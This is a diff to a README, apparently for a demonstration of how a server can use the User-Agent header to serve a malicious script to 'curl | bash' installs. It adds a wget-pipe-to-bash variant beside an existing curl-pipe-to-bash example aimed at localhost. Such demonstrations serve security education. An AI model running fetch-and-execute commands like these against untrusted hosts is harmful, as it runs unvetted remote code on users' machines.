@@ -6,6 +6,8 @@ By using the `User-Agent` header we detect whether or not the call is coming fro
 ## Malicious
 ### Request
 ```
+# wget -qO - http://localhost:3000/install.sh | bash, yields the same result
+
 curl -sSL http://localhost:3000/install.sh | bash
 ```
 
